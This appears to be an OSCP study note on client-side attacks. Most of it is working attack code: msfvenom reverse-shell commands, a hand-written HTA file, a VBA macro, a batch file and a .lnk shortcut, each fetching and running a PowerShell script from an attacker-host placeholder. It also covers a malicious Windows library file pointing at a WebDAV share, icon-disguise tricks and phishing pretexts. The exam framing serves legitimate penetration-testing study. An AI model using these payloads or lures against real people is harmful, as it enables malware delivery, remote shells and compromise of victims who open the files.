# Client-Side Attacks (PEN-200 Module 11)

> **Scope:** HTA payloads, VBA macros, OLE object embedding, Windows Library files, and basic phishing pretexts. These require the target to open/execute a file — the attacker delivers, the user detonates.
>
> **Exam note:** client-side attacks are legitimate OSCP technique on standalone machines. msfvenom payload generation is unrestricted. `multi/handler` catching a non-Meterpreter payload (e.g. `shell_reverse_tcp`) is also generally considered unrestricted; only Meterpreter sessions count toward the one-machine Metasploit limit. See [`metasploit-framework-guide.md`](metasploit-framework-guide.md) for full details.
>
> See also: [`notes/file-transfer-matrix.md`](file-transfer-matrix.md) for staging/delivery methods.

---

## 1. HTA (HTML Application) Payloads

HTA files execute as fully trusted applications under `mshta.exe` — no browser sandbox, full COM/WScript access.

**Generate with msfvenom:**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f hta-psh -o evil.hta
```

**Minimal hand-rolled HTA (PowerShell download-cradle → reverse shell):**
```html
<html>
<head>
<script language="VBScript">
  Sub RunPayload()
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -ep bypass -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')""", 0
  End Sub
  RunPayload
</script>
</head>
<body></body>
</html>
```

**Delivery:** host on a web server, send the link. When the target opens it in IE/Edge (legacy), `mshta.exe` renders and executes it. Can also deliver as a file attachment — double-clicking an `.hta` file invokes `mshta.exe` directly.

**Direct mshta execution (no file drop, useful for command injection chains):**
```
mshta http://<ATTACKER_IP>/evil.hta
```

---

## 2. VBA Macro Payloads (Office Documents)

VBA macros run when a user enables them ("Enable Content" prompt) in Word/Excel.

**Generate macro payload with msfvenom:**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f vba -o macro.vba
```

**Manual VBA reverse shell (Word/Excel macro — paste into VBA editor Alt+F11):**
```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell -ep bypass -nop -w hidden -e <BASE64_ENCODED_PAYLOAD>"
    Shell str, vbHide
End Sub
```
Generate the base64-encoded payload:
```bash
echo -n "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
```

**File format matters:**
- `.docm` / `.xlsm` — macro-enabled, but the extension itself is a warning sign
- `.doc` / `.xls` (legacy format) — macros work and the extension looks benign
- `.docx` / `.xlsx` — XML-based, **cannot** contain macros (rename tricks don't work)

**`AutoOpen` / `Document_Open`:** both are needed to cover Word opening the doc from Explorer (AutoOpen) vs. from within Word (Document_Open). Excel uses `Auto_Open` and `Workbook_Open`.

---

## 3. OLE Object Embedding

Embed an executable inside a Word/Excel document as an OLE object — the user double-clicks the icon in the document to execute it.

**Steps (Word):**
1. Generate payload: `msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f exe -o payload.exe`
2. In Word: Insert → Object → Create from File → browse to `payload.exe` → check "Display as icon" → change icon to something benign (e.g., PDF icon) → OK
3. The document now contains the embedded EXE. When the target double-clicks the icon, Windows prompts "Do you want to open this file?" → Yes → payload executes.

**Batch file variant (avoids .exe suspicion):**
```batch
@echo off
START /B powershell -ep bypass -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')"
```
Save as `readme.bat`, embed as OLE object with a text-file icon.

---

## 4. Windows Library Files (.library-ms)

Windows Library files (`.library-ms`) are XML files that define a library pointing to a remote location. When a user double-clicks the library file, Explorer mounts the remote share and displays its contents — if the share contains a payload (`.lnk`, `.exe`, `.hta`), the user may execute it thinking it's a local file.

**Create a malicious library file (config.library-ms):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://<ATTACKER_IP></url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

**Pair with WebDAV:** host the payload directory on a WebDAV server (e.g., `wsgidav --host 0.0.0.0 --port 80 --root ./payload-dir --auth anonymous`). The library file points Explorer to the WebDAV share; the user sees the share contents as a local folder.

**Shortcut (.lnk) payload in the WebDAV share:**
```powershell
$shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("install.lnk")
$shortcut.TargetPath = "powershell"
$shortcut.Arguments = "-ep bypass -nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')`""
$shortcut.IconLocation = "C:\Windows\System32\imageres.dll,48"
$shortcut.Save()
```

---

## 5. Delivery Considerations

| Method | Notes |
|--------|-------|
| Email attachment | Most direct; `.doc`/`.xls`/`.hta` are commonly allowed through mail filters in OSCP lab scenarios |
| Web hosting + link | `python3 -m http.server 80` — target downloads and opens |
| SMB share | `impacket-smbserver SHARE . -smb2support` — UNC path in phishing email |
| WebDAV | Pairs with library files; `wsgidav` or `cadaver` |

**Pretext tips (lab/exam context):**
- Keep it simple: "Please review the attached document" or "Updated procedure — see attachment"
- Match the file type to the scenario (HR document → Word, financial data → Excel)
- The OSCP exam tests technical execution, not social engineering creativity

---

## References
- HTA attacks: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
- Macro payloads: https://book.hacktricks.wiki/en/windows-hardening/basic-cmd-for-pentesters.html
- Library files: https://www.offensive-security.com/offsec/creative-delivery-mechanisms/
